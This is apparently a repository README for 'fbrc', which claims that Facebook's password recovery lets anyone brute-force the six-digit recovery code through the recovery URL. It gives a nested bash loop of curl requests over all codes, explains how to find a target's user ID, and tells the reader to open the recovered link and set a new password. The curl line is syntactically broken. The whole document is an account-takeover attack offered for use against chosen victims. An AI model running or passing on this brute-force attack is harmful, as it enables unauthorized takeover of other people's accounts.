# fbrc
fbrc - FaceBook Recovery Cracker

Prerequisites:

- access to facebook
- target email or phone number

Facebook recovery suffers from a security flaw, that is when user asks for a recovery code, it isn't required to enter this code in the formular for the new password's page to be created.
Thus it's possible to trigger the recovery process and then bruteforce the recovery url.

You can do this with any software or a simple program that will generate a million code (6 digits) and try a GET request like this:

`for i in {0..9}; do for j in {0..9}; do for k in {0..9}; do for l in {0..9}; do for m in {0..9}; do for n in {0..9}; do curl 'https://www.facebook.com/recover/password/?u=&n=$i$j$k$l$m$n |grep password_new; done; done; done; done; done; done`

You must pass the user_id to the `u`parameter, you will find this id in the souce code of the page on the wall of the user, just search for USER_ID.

This curl script is the simplest and will output something only when the code is found, you'll find the code somewhere in the console, just go to the recovery link we just bruteforced using the ID and code in a browser.
